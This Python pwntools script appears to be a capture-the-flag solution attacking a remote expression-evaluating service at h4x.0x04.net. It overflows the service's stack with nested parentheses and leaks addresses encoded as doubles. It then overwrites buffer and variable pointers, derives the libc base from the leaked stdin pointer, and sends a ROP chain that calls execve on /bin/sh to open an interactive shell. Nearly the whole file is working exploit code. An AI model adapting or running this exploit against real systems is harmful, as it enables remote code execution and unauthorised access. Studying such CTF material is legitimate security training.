import requests
from urllib import quote
import xml.etree.ElementTree as ET
from pwn import *

STACK_SIZE = 32
VECTOR_WIDTH = 8

BUF_ADDR_ID = 1
VARS_ADDR_ID = 4
STDIN_ADDR_ID = 5
RET_ADDR_ID = 7

# converts hex string '0x956fa79a4dd7cd00' to double string representation '-1.97192842818324546837e-205'
def payload_to_double(hex_x):
    url = 'https://gregstoll.dyndns.org/~gregstoll/floattohex/floattohex.cgi?action=hextodouble&hex=' + quote(hex_x)
    resp = requests.get(url)
    values = ET.fromstring(resp.content)
    return values[0].text

# converts double string '-1.97192842818324546837e-205' to hex string representation '0x956fa79a4dd7cd00'
def double_to_hex(dec_x):
    url = 'https://gregstoll.dyndns.org/~gregstoll/floattohex/floattohex.cgi?action=doubletohex&double=' + quote(dec_x)
    resp = requests.get(url)
    values = ET.fromstring(resp.content)
    return values[1].text

# converts endianess ex. '0x414243' to '0x43424100' and fill with zeros
def revert(hex):
    res = ''
    for i in range(len(hex) - 1, 2, -2):
        res += hex[i - 1]
        res += hex[i]
    pad_len = 8 - len(res) / 2
    res += '00' * pad_len
    res = '0x' + res
    return res


def override_vars_and_buf_addr(p):
    # (((((((((((((((((((((((((((((((+)))))))))))))))))))))))))))))))
    payload = b'(' * (STACK_SIZE - 1) + b'+' + b')' * (STACK_SIZE - 1)
    log.info("Sending: " + payload)
    p.sendline(payload)
    resp = p.recvline().strip()
    log.info("Received: " + resp)
    payload = []
    for i in range(VECTOR_WIDTH):
        hex_addr = resp.split(',')[i][1:]
        if i == VECTOR_WIDTH - 1:
            hex_addr = hex_addr[:-1]
        payload.append(hex_addr)
    
    # stdin address
    stdin_addr = int(double_to_hex(payload[STDIN_ADDR_ID]), 16)

    # override buf address
    payload[BUF_ADDR_ID] = str(payload_to_double(str(hex(int(double_to_hex(payload[BUF_ADDR_ID]), 16) + 1024))))
    # override vars address
    payload[VARS_ADDR_ID] = str(payload_to_double(str(hex(int(double_to_hex(payload[VARS_ADDR_ID]), 16) - 1032))))

    payload = b'-' * (STACK_SIZE - 1) + b'{' +  b', '.join(payload) + b'}'
    log.info("Sending:" + payload)
    p.sendline(payload)
    resp = p.recvline().strip()
    log.info("Received: " + resp)

    return stdin_addr

def find_libc_base_addr(stdin_addr):
    libc_elf = ELF('libc.so.6')
    stdin_offset = libc_elf.symbols['stdin']
    libc_base_addr = stdin_addr - stdin_offset
    return libc_base_addr    

# mov rax, 0x3b 
# mov rdi, </bin/sh addr>
# mov rsi, 0
# mov rdx, 0
# syscall
def set_shell(p, libc_base_addr):
    payload = [0] * VECTOR_WIDTH
    payload[0] = g1_pop_rax = 0x000000000003ad30
    payload[1] = rax_val = 0x3b
    payload[2] = g2_pop_rdi = 0x0000000000023be3
    payload[3] = rdi_val = 0x0000000000184519
    payload[4] = g3_pop_rdx_rsi = 0x0000000000109159
    payload[5] = rdx_val = 0x0
    payload[6] = rsi_val = 0x0
    payload[7] = g5_syscall = 0x0000000000024284

    for i in range(VECTOR_WIDTH):
        if i not in [1, 5, 6]:
            payload[i] += libc_base_addr
        payload[i] = payload_to_double(hex(payload[i]))
    
    payload = b'a={' + b', '.join(payload) + b'}'
    
    log.info("Sending: " + payload)
    p.sendline(payload)
    p.interactive()

def main():
    p = remote('h4x.0x04.net', 1337)

    stdin_addr = override_vars_and_buf_addr(p)

    libc_base_addr = find_libc_base_addr(stdin_addr)
    log.info("libc_base_addr " + hex(libc_base_addr))

    set_shell(p, libc_base_addr)

    p.wait_for_close()
    print(p.poll())

if __name__ == '__main__':
    main()